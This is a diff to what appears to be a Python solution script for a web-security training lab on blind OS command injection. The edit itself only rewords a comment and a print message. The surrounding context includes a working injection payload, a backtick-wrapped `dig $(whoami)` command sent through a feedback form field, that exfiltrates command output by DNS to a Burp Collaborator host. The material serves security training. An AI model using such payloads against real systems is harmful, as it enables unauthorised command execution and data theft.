@@ -7,7 +7,7 @@
 # Lab: Blind OS command injection with out-of-band data exfiltration
 #
 # Steps: 1. Fetch the feedback page
-#        2. Extract csrf token and session cookie
+#        2. Extract the csrf token and session cookie
 #        3. Inject payload into the name field when submitting a feedback
 #           to execute the `whoami` command and exfiltrate the output via
 #           a DNS query to burp collaborator.
@@ -52,7 +52,7 @@ session = injection.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # the payload to execute the `whoami` command and exfiltrate the output via a DNS query to burp collaborator
 payload = f"`dig $(whoami).{collaborator}`"
